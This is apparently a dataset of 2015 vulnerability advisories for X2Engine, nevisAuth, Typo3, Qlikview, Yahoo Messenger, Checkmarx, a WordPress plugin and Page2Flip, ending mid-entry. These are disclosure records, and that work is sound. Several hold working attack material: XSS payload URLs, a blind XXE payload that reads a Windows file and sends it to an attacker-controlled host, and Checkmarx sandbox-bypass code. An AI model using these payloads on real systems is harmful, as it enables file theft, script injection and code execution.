4125,CVE-2015-5074 - Arbitrary File Upload In X2Engine Inc. X2Engine,,CVE-2015-5074,"Vulnerability title: Arbitrary File Upload In X2Engine Inc. X2Engine
CVE: CVE-2015-5074
Vendor: X2Engine Inc.
Product: X2Engine
Affected version: 4.2
Fixed version: 5.2
Reported by: Simone Quatrini
Details:
It was discovered that authenticated users were able to upload files of any type providing that the file did not have an extension that was listed in the following blacklist:
const EXT_BLACKLIST = '/.s*(P<ext>html|htm|js|jsb|mhtml|mht|xhtml|xht|php|phtml|php3|php4|php5|phps|shtml|jhtml|pl|py|cgi|exe|scr|dll|msi|vbs|bat|com|pif|cmd|vxd|cpl|ini|conf|cnf|key|iv|htaccess)/i';
However, there is another common (not present in regexp) that allow PHP execution: .PHT. It is therefore possible to execute any PHP code on the remote system.
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2015-5074/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2015, All rights reserved worldwide. Permission is hereby granted for the electronic redistribution of this information. It is not to be edited or altered in any way without the express written consent of Portcullis Computer Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this information constitutes acceptance for use in an AS IS condition. There are NO warranties, implied or otherwise, with regard to this information or its use. Any use of this information is at the user's risk. In no event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in connection with the use or spread of this information.
###############################################################
This email originates from the systems of Portcullis
Computer Security Limited, a Private limited company,
registered in England in accordance with the Companies
Act under number 02763799. The registered office
address of Portcullis Computer Security Limited is:
Portcullis House, 2 Century Court, Tolpits Lane, Watford,
United Kingdom, WD18 9RS.
The information in this email is confidential and may be
legally privileged. It is intended solely for the addressee.
Any opinions expressed are those of the individual and
do not represent the opinion of the organisation. Access
to this email by persons other than the intended recipient
is strictly prohibited.
If you are not the intended recipient, any disclosure,
copying, distribution or other action taken or omitted to be
taken in reliance on it, is prohibited and may be unlawful.
When addressed to our clients any opinions or advice
contained in this email is subject to the terms and
conditions expressed in the applicable Portcullis Computer
Security Limited terms of business.
###############################################################
#####################################################################################
This e-mail message has been scanned for Viruses and Content and cleared
by MailMarshal.
#####################################################################################"
4126,CVE-2015-5076 - Vulnerability title: Reflective XSS In X2Engine Inc. X2Engine,,CVE-2015-5076,"Vulnerability title: Reflective XSS In X2Engine Inc. X2Engine
CVE: CVE-2015-5076
Vendor: X2Engine Inc.
Product: X2Engine
Affected version: 4.2
Fixed version: 5.2
Reported by: Simone Quatrini
Details:
It was discovered that the web application was vulnerable to reflective Cross-Site Scripting where user supplied data is used to generate the subsequent response. This is a normal feature of many applications, however, in this instance the application failed to restrict the type of data that was accepted and also failed to sanitise it, meaning that it could not be safely rendered by the browser.
A number of locations were identified as beuing vulnerable, including:
x2engine/protected/views/admin/formEditor.php:144:<a style=""float:right;position:relative;top:10px;""
href=""deleteVersion?version=<?php echo isset($_GET['version'])?$_GET['version']:'';?>"" class=""x2-button"">Delete Selected Version</a>
x2engine/protected/views/admin/rollbackImport.php:99: <?php echo Yii::t('admin','Import ID: '); ?><strong><?php echo $_GET['importId'];?></strong>
x2engine/protected/views/site/listener.php:69: if(!empty($_GET['bc'])) echo $_GET['bc'];
x2engine/protected/views/site/listener.php:83: <?php if (!empty($_GET['fg'])) echo 'color: '. $_GET['fg'] .""; ""; unset($_GET['fg']); ?>
x2engine/protected/views/site/listener.php:84: <?php if (!empty($_GET['bgc'])) echo 'background-color: '. $_GET['bgc'] .""; ""; unset($_GET['bgc']); ?>
x2engine/protected/views/site/listener.php:87: echo 'font-family:'. FontPickerInput::getFontCss($_GET['font']) .""; "";
x2engine/protected/components/views/webForm.php:292: value=""<?php echo isset($_POST['Services'][$field['fieldName']]) ?
x2engine/protected/components/TranslationManager.php:383:<input type=""hidden"" name=""file"" value=""<?php echo $_GET['file']; ?>"">
x2engine/protected/tests/webscripts/x2WebTrackingTestPages/customWebLeadCaptureScriptTest.php:61:<div id=""success"">success<?php echo $_POST['x2_key']; ?></div>
x2engine/protected/modules/contacts/controllers/ContactsController.php:577:echo $_POST['id'];
x2engine/protected/modules/contacts/controllers/ContactsController.php:581: echo $_POST['id'];
An attacker could create a malicious link with the following URL:
http://localhost/x2engine/index.php/profile/getEvents?lastEventId=<img src=aonerror=alert('xss')>&lastTimestamp=1408631575&profileId=3&myProfileId=3
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2015-5076/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2015, All rights reserved worldwide. Permission is hereby granted for the electronic redistribution of this information. It is not to be edited or altered in any way without the express written consent of Portcullis Computer Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this information constitutes acceptance for use in an AS IS condition. There are NO warranties, implied or otherwise, with regard to this information or its use. Any use of this information is at the user's risk. In no event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in connection with the use or spread of this information.
###############################################################
This email originates from the systems of Portcullis
Computer Security Limited, a Private limited company,
registered in England in accordance with the Companies
Act under number 02763799. The registered office
address of Portcullis Computer Security Limited is:
Portcullis House, 2 Century Court, Tolpits Lane, Watford,
United Kingdom, WD18 9RS.
The information in this email is confidential and may be
legally privileged. It is intended solely for the addressee.
Any opinions expressed are those of the individual and
do not represent the opinion of the organisation. Access
to this email by persons other than the intended recipient
is strictly prohibited.
If you are not the intended recipient, any disclosure,
copying, distribution or other action taken or omitted to be
taken in reliance on it, is prohibited and may be unlawful.
When addressed to our clients any opinions or advice
contained in this email is subject to the terms and
conditions expressed in the applicable Portcullis Computer
Security Limited terms of business.
###############################################################
#####################################################################################
This e-mail message has been scanned for Viruses and Content and cleared
by MailMarshal.
#####################################################################################"
4154,CVE-2015-5372 SAML SP Authentication Bypass in nevisAuth,,CVE-2015-5372,"#############################################################
#
# COMPASS SECURITY ADVISORY
# http://www.csnc.ch/en/downloads/advisories.html
#
#############################################################
#
# Product: nevisAuth [1]
# Vendor: AdNovum [2]
# CVD ID: CVE-2015-5372
# Subject: Authentication Bypass
# Risk: Critical
# Effect: Remotely exploitable
# Authors: Antoine Neuenschwander (antoine.neuenschwander csnc ch)
# Roland Bischofberger (roland.bischofberger csnc ch)
# Date: 2015-09-21
#
#############################################################
Introduction:
-------------
nevisAuth implements strong user and system authentication for identity and
access management solutions. It offers secure execution of multi-step
authentication and is able to dynamically adjust authentication strengths.
nevisAuth is highly flexible, easily integrated and supports plug-ins to various
authentication methods. [1]
Security Analysts of Compass Security Schweiz AG [3] discovered a security flaw
in the SAML 2.0 implementation of nevisAuth, which allows an attacker to bypass
the signature validation of security assertions, and therefore impersonate other
users.
Affected:
---------
nevisAuth since v4.13.0.0 (2012-11-21)
A security fix was released with version v4.18.3.1 (2015-07-02)
Technical Description:
----------------------
When configured as a SAML 2.0 service provider (SP), nevisAuth authenticates
users based on security assertions issued and signed by a trusted identity
provider (IdP). An assertion contains various fields about the user or subject
being authenticated, e.g. a name identifier (NameID), various attributes and
timestamps. Trust is based on the IdP's certificate, which is used to validate
the digital signature of security assertions.
In a setup where security assertions are conveyed via User-Agent (i.e when using
HTTP POST Binding), it is possible to forge and inject new assertions based on
data intercepted during a valid past authentication process. To achieve this,
the signing certificate is extracted from the assertion and then cloned to
reflect all X.509 data fields. A new public/private key pair is generated. The
public key is inserted into the certificate and the private key is used to sign
it. The signing certificate in the security assertion is now replaced with its
rogue copy. The attacker can then modify arbitrary values of the assertion, for
example the NameID. Finally, the assertion is signed with the cloned
certificate.
Due to a flaw in affected versions of nevisAuth, it is possible to bypass
validation of security assertions by presenting the system with forged
assertions as described above. In consequence, an attacker can impersonate
other users. More details on the attack can be found in [4].
Workaround / Fix:
-----------------
AdNovum released a security fix in nevisAuth v4.18.3.1 (2015-07-02) to address
this issue.
Alternatively, when using HTTP POST Binding, use encrypted security assertions
for transmission via the User-Agent. Or completely avoid transmitting security
assertions over insecure channels by using HTTP Artifact Binding.
Timeline:
---------
2015-06-26: Discovered vulnerability
2015-06-30: CVE ID requested
2015-07-01: Initial vendor notification
2015-07-02: Vendor confirmed security issue
2015-07-03: Vendor released security fix & guidance to its customers
2015-07-06: CVE ID assigned
2015-09-21: Public disclosure
Acknowledgements:
-----------------
This vulnerability was discovered using the SAMLRaider Plugin [5] for Burp
Suite [6], developed by Roland Bischofberger (roland.bischofberger csnc ch) and
Emanuel Duss (emanuel.duss gmail com).
References:
-----------
[1]: https://www.nevis.ch/en/products/nevisauth-authentication-service.html
[2]: http://www.adnovum.ch/en/
[3]: http://www.csnc.ch/advisories
[4]: http://blog.csnc.ch/2015/09/saml-sp-authentication-bypass-vulnerability-in-nevisauth
[5]: https://github.com/SAMLRaider/SAMLRaider
[6]: http://portswigger.net/burp/"
4176,[CVE-2015-5956] Typo3 Core sanitizeLocalUrl() Non-Persistent Cross-Site Scripting,,CVE-2015-5956,"secunet Security Networks AG Security Advisory
Advisory: Typo3 Core sanitizeLocalUrl() Non-Persistent Cross-Site Scripting
1. DETAILS
----------
Product: Typo3 CMS
Vendor URL: typo3.org
Type: Cross-site Scripting[CWE-79]
Date found: 2015-07-30
Date published: 2015-09-14
CVSSv2 Score: 3,5 (AV:N/AC:M/Au:S/C:N/I:P/A:N)
CVE: CVE-2015-5956
2. AFFECTED VERSIONS
--------------------
Typo3 6.2.14 and below
Typo3 4.5.40 and below
and other older versions may be affected too.
3. INTRODUCTION
---------------
""With more than 500,000 installations TYPO3 CMS is the most widely used
Enterprise Content Management System, providing the basis for websites,
intranets and web & mobile applications worldwide.""
(from the vendor's homepage)
4. VULNERABILITY DETAILS
------------------------
The Typo3 version branches 6.x and 4.x are vulnerable to an authenticated,
non-persistent Cross-Site Scripting vulnerability when user-supplied input
is processed by the sanitizeLocalUrl() function. While there is already a
XSS filter in place, it is possible to mitigate it by using a data URI with
a base64 encoded payload.
The payload is slightly different through the vulnerable branches, 6.x needs
a space in the data URI payload, while 4.x doesn't. In the following proof
of concepts, the javascript <script>alert('XSS')</script> is used as a
base64 encoded data URI in the ""returnUrl"" and ""redirect_url"" parameters,
which can be found throughout Typo3.
4.x Branch Proof-of-Concept:
The following request forges the ""back"" link in the Typo3 ""Show record
history"" backend module:
https://example.com/typo3/show_rechis.php?returnUrl=data:text/html;base64,PH
NjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
6.x Branch Proof-of-Concept:
Typo3 uses the payload from the ""redirect_url"" parameter in the HTTP
Location header and therefore ""redirects"" the victim to the payload after
logging in:
https://example.com/typo3/index.php?redirect_url=data:text/html;base64,%20PH
NjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
7.x Branch:
The 7.x branch is basically vulnerable too, but the attacker additionally
needs to know a secret token (moduleToken), which is included in every
request in order to successfully exploit the vulnerability, which makes
exploitation unfeasible.
The following request forges the ""back"" link in the Typo3 ""Show record
history"" backend module:
https://example.com/typo3/index.php?M=record_history&moduleToken=260ab28ad49
73d29e0a77d2f799e79ca3028de28&element=tt_content%3A1&returnUrl=&returnUrl=da
ta:%20text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
5. SECURITY RISK
----------------
The vulnerability can be used to temporarily embed arbitrary script code
into the context of the Typo3 backend interface, which offers a wide range
of possible attacks such as stealing cookies or attacking the browser and
its components.
The exploit probability is different depending on the attacked parameters.
In order to exploit the ""redirect_url"" parameter, the victim only has to
login to the backend interface, while there is an even higher amount of user
interaction needed to exploit the ""returnUrl"" parameter, because the victim
needs to be logged in to the backend with appropriate access rights, follow
the prepared link and has to click on the ""Back"" button in the view.
6. SOLUTION
-----------
Update to TYPO3 versions 6.2.15 or 7.4.0
7. REPORT TIMELINE
------------------
2015-07-30: Vulnerability discovered
2015-08-03: CVE requested from MITRE
2015-08-04: Vendor notified
2015-08-07: CVE-2015-5956 assigned
2015-08-07: Vendor acknowledges the vulnerability
2015-09-08: Vendor releases update and security advisory
2015-09-14: Advisory released
8. REFERENCES / CREDITS
-----------------------
This vulnerability was discovered and researched by Julien Ahrens from
secunet Security Networks AG.
[0]
https://typo3.org/teams/security/security-bulletins/typo3-core/typo3-core-sa
-2015-009/
secunet Security Networks AG
----------------------------
secunet is one of Germany's leading providers of superior IT security. In
close dialogue with its customers – enterprises, public authorities and
international organisations – secunet develops and implements
high-performance products and state-of-the-art IT security solutions. Thus,
secunet not only keeps IT infrastructures secure for its customers, but also
achieves intelligent process optimisation and creates sustainable added
value. More information about secunet can be found at:
https://www.secunet.com
--
secunet Security Networks AG
Kronprinzenstraße 30
45128 Essen, Germany
Local Court of Essen HRB 13615
Board of management: Dr. Rainer Baumgart (CEO), Thomas Pleines"
4204,[CVE-2015-3623] Qlikview blind XXE Security Vulnerability,,CVE-2015-3623,"Exploit Title: Qlikview blind XXE security vulnerability
Product: Qlikview
Vulnerable Versions: v11.20 SR11 and previous versions
Tested Version: v11.20 SR4
Advisory Publication: 08/09/2015
Latest Update: 08/09/2015
Vulnerability Type: Improper Restriction of XML External Entity Reference [CWE-611]
CVE Reference: CVE-2015-3623
Credit: Alex Haynes
Advisory Details:
(1) Vendor & Product Description
--------------------------------
Vendor: QLIK
Product & Version:
QlikView v11.20 SR4
Vendor URL & Download:
http://www.qlik.com/us/explore/products/qlikview
Product Description:
""The QlikView Business Discovery platform delivers true self-service BI that empowers business users by driving innovative decision-making.""
(2) Vulnerability Details:
--------------------------
The Qlikview platform is vulnerable to XML External Entity (XXE) vulnerabilities. More specifically, the platform
is susceptible to DTD parameter injections, which are also ""blind"" as the server feeds back no visual response. These vulnerabilities can be exploited
to force Server Side Request Forgeries (SSRF)in multiple protocols, as well as reading and extracting arbitrary files on the server directly.
Proof of concept for XXE [CVE-2015-5361]:
-----------------------------------------
URL: https://<QLIKVIEW>/AccessPoint.aspx
Attack Pattern for SSRF:
------------------------
In POST body:
<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE update [
<!ENTITY % external SYSTEM ""http://yourserver.com"">
%external;]>
OR simply
<?xml version=""1.0"" encoding=""utf-8""?>
<!DOCTYPE roottag PUBLIC ""-//WHITE//NINJA//EN"" ""http://yourserver.com"">
As this is a blind XXE, you will see no response from server, but yourserver.com will receive the HTTP request from the Qlikview server. Also works with FTP and HTTPS protocols.
Attack Pattern for reading and extracting arbitrary files:
------------------------------------------
In POST body:
<?xml version=""1.0"" encoding=""utf-8""?>
<!DOCTYPE roottag [
<!ENTITY % remote SYSTEM ""file:///c:/windows/win.ini"">
<!ENTITY % dtd SYSTEM ""http://yourserver.com/test.dtd"">
%dtd;
%send;
]]>
The test.dtd file on yourserver.com will need to contain the following:
Test.dtd
--------
<!ENTITY % all ""<!ENTITY &#x25; send SYSTEM 'http://yourserver.com/?%remote;'>"">
%all;
As the response is blind, you will see no response from the server, but yourserver.com will receive the file contents as part of the URL in lieu of the %remote parameter.
(3) Advisory Timeline:
----------------------
29/04/2015 - First Contact informing vendor of vulnerability
30/04/2015 - Response requesting details of vulnerability. Details sent
05/05/2015 - Vendor indicates issue is under investigation.
06/05/2015 - Vendor confirms vulnerability and has started working on resolving the issue.
20/05/2015 - Vendor confirms root cause has been identified and patch is under internal testing.
08/06/2015 - Vendor confirms patch ready and requests 90 day restraint on vulnerability release to give clients time to patch.
10/06/2015 - Patch 11.20 SR12 released, fixing the vulnerability
08/09/2015 - Public disclosure of vulnerability.
(4)Solution:
------------
Upgrade to QV11.20 SR12 will correct the vulnerability.
(5) Credits:
------------
Discovered by Alex Haynes
References:
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3623
http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-3623"
4212,[CVE-2014-7216] Yahoo! Messenger emoticons.xml Multiple Key Value Handling Local Buffer Overflow,,CVE-2014-7216,"RCE Security Advisory
https://www.rcesecurity.com
1. ADVISORY INFORMATION
-----------------------
Product: Yahoo! Messenger
Vendor URL: www.yahoo.com
Type: Stack-based Buffer Overflow [CWE-121]
Date found: 2014-05-02
Date published: 2015-09-03
CVSSv3 Score: 4,8 (AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L)
CVE: CVE-2014-7216
2. CREDITS
----------
This vulnerability was discovered and researched by Julien Ahrens from
RCE Security.
3. VERSIONS AFFECTED
--------------------
Yahoo! Messenger v11.5.0.228 (latest)
Yahoo! Messenger v10.0.0.2009
older versions may be affected too.
4. INTRODUCTION
---------------
Yahoo Messenger is the premier instant messaging (IM) platform, used on
a wide variety of desktop and mobile clients. Millions of users
throughout the world depend on Yahoo Instant Messenger to manage their
social contacts, group lists, and presence information; hold real-time
instant communications; and perform data transfer to and from contacts
throughout the world. All instantly.
(from the vendor's homepage)
5. VULNERABILITY DESCRIPTION
----------------------------
Multiple buffer overflow vulnerabilities have been identified in Yahoo!
Messenger v11.5.0.228 and prior.
The application loads the content of the file emoticons.xml from two
different directories %PROGRAMFILES(x86)%Yahoo!MessengerCache and
%PROGRAMFILES(x86)%Yahoo!MessengerMediaSmileys when a user logins to
determine the available emoticons and their associated shortcuts, which
can be used in the chat window. But the application does not properly
validate the length of the string of the ""shortcut"" and ""title"" key
values before passing them as an argument to different lstrcpyW calls.
This leads to a stack-based buffer overflow condition, resulting in
possible code execution. An attacker needs to trick the victim to copy
an arbitrary emoticons package to the application directory in order to
exploit the vulnerability. Successful exploits can allow attackers to
execute arbitrary code with the privileges of the user running the
application. Failed exploits will result in a denial-of-service condition.
6. PROOF-OF-CONCEPT (VULNERABLE CODE PARTS)
-------------------------------------------
YahooMessenger.exe:
title value:
0051D2C1 PUSH DWORD PTR DS:[EAX] ; /String2
0051D2C3 LEA EAX,DWORD PTR SS:[EBP] ; |
0051D2C6 PUSH EAX ; |String1
0051D2C7 CALL DWORD PTR DS:[<&KERNEL32.lstrcpyW>; lstrcpyW
shortcut value:
0051D326 PUSH DWORD PTR DS:[ESI+4] ; /String2
0051D329 LEA EAX,DWORD PTR SS:[EBP] ; |
0051D32C PUSH EAX ; |String1
0051D32D CALL DWORD PTR DS:[<&KERNEL32.lstrcpyW>>; lstrcpyW
7. SOLUTION
-----------
None. Won't be fixed.
8. REPORT TIMELINE
------------------
2014-05-02: Discovery of the vulnerability
2014-05-03: Reported via Yahoo! Bug Bounty program (hackerone.com)
2014-07-19: Vendor forwards the issue to the dev team
2014-08-31: Request for status update due to Yahoo's 120-day policy
2014-09-10: Vendor is still evaluating the issue
2014-09-20: Vendor closes the issue as ""Won't fix"" due to EOL
2014-10-01: MITRE assigns CVE-2014-7216
2014-10-05: Request to disclose the bug publicly
2015-08-14: Vendor approves the disclosure
2015-09-03: Advisory released
9. REFERENCES
-------------
https://www.rcesecurity.com/2015/09/cve-2014-7216-a-journey-through-yahoos-bug-bounty-program
https://hackerone.com/reports/10767"
4215,Checkmarx CxQL Sandbox bypass (CVE-2014-8778),,CVE-2014-8778,"Checkmarx CxQL Sandbox bypass (CVE-2014-8778)
Vendor: Checkmarx - www.checkmarx.com
Product: CxSuite
Version affected: 7.1.5 and prior
Credit: Huy-Ngoc DAU (@ngocdh) of Deloitte Conseil, France
================================
Introduction
================================
Checkmarx is a static source code analysis suite (https://www.checkmarx.com).
CxQL (Checkmarx Query Language) is a CSharp-based language defined by Checkmarx to query source code. CSharp critical classes/functions calls are however not allowed due to security reasons.
CxQL can be executed on two locations:
- Remotely on Checkmarx server if the analyzed source code is uploaded via the web interface,
- Or locally in CxAudit (a thick client connected to the enterprise Checkmarx server), installed on an auditor's code review workstation.
We identified a possibility of bypass that would allow execution of arbitrary and unauthorized CSharp code in those contexts, and thus compromise the security of the machine on which the code is executed, either a Checkmarx server or an auditor's workstation.
The following scenarios describe attacks where this bypass is possible:
- An auditor (a specific user allowed to execute his own CxQL queries) having only access to the Citrix interface of CxAudit can take control of the workstation,
- A Checkmarx administrator having only access to Checkmarx web interface can take control of the Checkmarx enterprise server, and CxAudit workstations by injecting malicious code into default queries.
================================
Technical details
================================
1. Etablishing network connection
The following code attempts to make a network connection and return the content in the debug panel:
try
{
System.Net.WebRequest request = System.Net.WebRequest.Create(""http://deloitte.fr"");
System.Net.WebResponse response = request.GetResponse();
CxDebug((new System.IO.StreamReader(response.GetResponseStream())).ReadToEnd());
}
catch (Exception e)
{
CxDebug(e.Message);
}
However, the following error message is returned:
Request for the permission of type 'System.Net.WebPermission, System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=xxx' failed.
We found that this permission issue could be bypassed by adding the following line before the code:
(new System.Net.WebPermission(System.Security.Permissions.PermissionState.Unrestricted)).Assert();
2. Executing system commands:
The following code attempts to open calc:
try
{
System.Diagnostics.Process.Start(""calc"");
}
catch (Exception e)
{
CxDebug(e.Message);
}
Checkmarx Auditor would crash despite try/catch instruction.
By adding the following line, the code would be executed successfully:
(new System.Security.Permissions.SecurityPermission(System.Security.Permissions.SecurityPermissionFlag.AllFlags)).Assert();
================================
Timeline
================================
25/10/2014 - bypass discovery
04/11/2014 - vendor notification
29/12/2014 - vendor asked to delay advisory publication
21/07/2015 - patch confirmation from vendor in version 7.1.8
03/09/2015 - advisory publication
================================
References
================================
https://checkmarx.atlassian.net/wiki/display/KC/Working+in+CxAudit
https://checkmarx.atlassian.net/wiki/display/KC/Working+with+Queries
https://checkmarx.atlassian.net/wiki/download/attachments/5406733/CxQL%20API%20Guide%207%201%204.pdf
About Deloitte:
Deloitte refers to one or more of Deloitte Touche Tohmatsu Limited, a UK private company limited by guarantee, and its network of member firms, each of which is a legally separate and independent entity. Please see www.deloitte.com/about for a detailed description of the legal structure of Deloitte Touche Tohmatsu Limited and its member firms. In France, Deloitte SAS is the member firm of Deloitte Touche Tohmatsu Limited, and professional services are provided by its subsidiaries and affiliates.
Our Enterprise Risk Services practice is made up of over 11,000 professionals providing services relating to security, privacy & resilience; data governance and analytics; information and controls assurance; risk management technologies; and technology risk & governance. We help organizations build value by taking a ""Risk Intelligent"" approach to managing financial, technology, and business risks."
4250,CVE-2015-6535: Stored XSS in YouTube Embed (WordPress plugin) allows admins to compromise super admins,,CVE-2015-6535,"Details
================
Software: YouTube Embed
Version: 3.3.2
Homepage: https://wordpress.org/plugins/youtube-embed/
CVE ID: CVE-2015-6535 (Pending)
CWE ID: CWE-79
CVSS: 5.5 (Medium; AV:N/AC:L/Au:S/C:P/I:P/A:N)
Description
================
A stored XSS vulnerability in YouTube Embed 3.3.2 (and possibly earlier versions) allows admin users to compromise other admins and super admins.
YouTube Embed is a WordPress plugin with over 30,000 active installs.
Vulnerability
================
Admins on multisite installs can inject arbitrary JavaScript into pages visible to super admins via the plugin's unsanitized profile name field.
Note: Admins on multisite installs lack the unfiltered_html capability � only super admins can enter unfiltered html [2].
From youtube-embed/includes/options-profiles.php:
31: $options[ 'name' ] = $_POST[ 'youtube_embed_name' ];
�
95: echo '<div class=""updated fade""><p><strong>' . __( $options[ 'name' ].' Profile Saved.' ) . ""</strong></p></div> "";
Proof of concept
================
1. As an admin user authorized for plugins, go to the YouTube Embed Profiles page.
2. Choose a profile from the drop down list on the right and click 'Change profile'.
3. Enter an XSS payload (e.g. <script>alert(1)</script>) into the 'Profile name' field.
4. Log out and log in as a super admin or a different admin.
5. Navigate to the YouTube Embed Options page.
This has been tested with Firefox 38.2.0 on Debian.
Mitigation
================
Upgrade the plugin to version 3.3.3 or later.
Timeline
================
2015-08-19: Discovered
2015-08-19: Requested vulnerability reporting instructions via vendor support form
2015-08-20: Vendor asked that vulnerability be reported on the vendor's website plugin page
2015-08-20: Reported to vendor via plugin page
2015-08-20: Requested CVE number
2015-08-23: Vendor released version 3.3.3 � confirmed fixed
2015-08-26: Public Disclosure
References
================
[1] https://wordpress.org/plugins/youtube-embed/changelog/
[2] https://codex.wordpress.org/Roles_and_Capabilities#Additional_Admin_Capabilities"
4265,[SYSS-2015-026] Denial of Service (CWE-730) and Overly Restrictive Account Lockout Mechanism (CWE-645) in Page2Flip Premium App 2.5,CWE-730,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2015-026
Product: Page2Flip
Vendor: w!ssenswerft GmbH
Affected Version(s): Premium App 2.5, probably also in Business App
and Basic App, and in lower versions
Tested Version(s): Premium App 2.5
Vulnerability Type: Denial of Service (CWE-730)
Overly Restrictive Account Lockout Mechanism (CWE-645)
Risk Level: Medium
Solution Status: Open
Vendor Notification: 2015-06-29
Solution Date:
Public Disclosure:
CVE Reference: Not yet assigned
Author of Advisory: Dr. Erlijn van Genuchten (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
With the Page2Flip Web application, it is possible to create e-papers in
PDF format that can be flicked through digitally. Such e-papers can be
used for magazines, catalogues, flyers, etc. (see [1]).
The Page2Flip application is vulnerable to denial-of-service attacks
against user accounts.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
The SySS GmbH identified a denial-of-service vulnerability in the user
login functionality. When for a user account, a wrong password has been
entered five times, this user account is locked.
This user account cannot be unlocked by an administrative user, nor is
it automatically unlocked after at least 12 hours.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
Enter for an existing e-mail address a wrong password five times.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2015-06-23: Vulnerability discovered
2015-06-29: Vulnerability reported to vendor
2015-07-07: Reported vulnerabilities again as the vendor did not respond
to the first e-mail
2015-07-14: Reminder sent concerning reported vulnerabilities
2015-08-24: Public release of security advisory according to the SySS
Responsible Disclosure Policy
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Page2Flip homepage
http://page2flip.de/
[2] SySS Responsible Disclosure Policy
https://www.syss.de/en/news/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Dr. Erlijn van Genuchten of the
SySS GmbH.
E-Mail: erlijn.vangenuchten syss de
Public Key: https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Erlijn_vanGenuchten.asc
Key ID: 0xBD96FF2A
Key Fingerprint: 17BB 4CED 755A CBB3 2D47 C563 0CA5 8637 BD96 FF2A
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1
iQIcBAEBCgAGBQJV2x4BAAoJEAylhje9lv8qLn4P/jxn+veP9aEfC5mdMtAhEnhz
poWMtjU5Rz9v0Gsrx/9Lgii7fshR75w6Ha1qSOgmDTmMK7W6uvdZSqiUwVLfJeqM
u+iS2KRNiWAFoGeXmEZcE26rugXv6aUIbQUqGrolcuxr1VcNHOoUh+ajLqzKjvL3
bA5HXwfFRzLQwBpdhEVRTkj+JhwW7nmH+VjRLXQ8le0jUUdv+jS9Abv8qfTePpof
8Rb10TN8TVAIZSkx3I2hzg6HpPKOxBmBJ9ZJPr8VHUHEJ07SsDhDT5TAz3y4HA0y
Fv49q2GxZvHE+Np/xbbKwIAu1969QOdFBqDIL7uWBUeMajZup9EM5Neec83BWM6B
pGjZ7BgACAQBsOea31np8ZbPv3vnvV0wr8EENZivavNNmM2BPHYyaNEUrlwWSpk3
Hvb4bzValh5EO05ZWZuC48Pe3uUIomaeQHxSNn+6neTFot380HmTf7R4T49Y8Mt3
hejpxRt8jExfT9E8meXez9MksNzw49Jg77TO/ZkT5X3v38WcpTJNy1O8gxd3r9VC
0TlQ7/53cue1zkPB5CEYfpEtbyWVrro+2ERar2fPXfWDSen8swUTcKXBj5iOvSPj
UZL8tA6lV8zIU23oW7UeFImaixJYgo/dF43so/PPt5YsviW6vyeHXd6nEghjPF4u
yevXceRPsSIbgKO2ZhV4
=LGVs
-----END PGP SIGNATURE-----"
4266,[SYSS-2015-027] Cross-Site Scripting (CWE-79) in Page2Flip Premium App 2.5,CWE-79,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2015-027
Product: Page2Flip
Vendor: w!ssenswerft GmbH
Affected Version(s): Premium App 2.5, probably also in Business App
and Basic App, and in lower versions
Tested Version(s): Premium App 2.5
Vulnerability Type: Cross-Site Scripting (CWE-79)
Risk Level: Medium
Solution Status: Open
Vendor Notification: 2015-06-29
Solution Date:
Public Disclosure:
CVE Reference: Not yet assigned
Author of Advisory: Dr. Erlijn van Genuchten (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
With the Page2Flip Web application, it is possible to create e-papers in
PDF format that can be flicked through digitally. Such e-papers can be
used for magazines, catalogues, flyers, etc. (see [1]).
